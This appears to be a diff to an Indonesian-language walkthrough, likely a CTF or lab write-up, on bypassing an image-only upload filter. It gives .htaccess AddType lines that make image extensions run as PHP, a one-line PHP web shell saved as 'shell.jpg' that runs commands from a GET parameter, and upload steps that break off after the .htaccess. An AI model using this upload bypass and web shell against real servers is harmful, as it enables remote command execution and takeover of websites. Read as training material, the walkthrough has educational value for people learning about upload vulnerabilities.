@@ -39,10 +39,25 @@ Ayo kita buat file jenis .htacess, karena web tersebut hanya menerima file jensi
     
     AddType application/x-httpd-php .jpg
 
+Untuk nama filenya itu file ".htaccess"
+
 Jika tidak bisa, maka gunakan payload:
     
     AddType application/x-httpd-php .png
     AddType application/x-httpd-php .gif
     AddType application/x-httpd-php .xyz
+
+Setelah itu, ayo kita buat file webshell yang menyamar menjadi file jpg
+ini payloadnya:
+                
+                <?php system($_GET['cmd']); ?>
+
+Nama filenya itu shell.jpg
+
+Setelah dibuat, cuss kita langsung upload ke 2 file tersebut.
+
+Kita upload file .htaccess terlebih dahulu
+
+
        
        
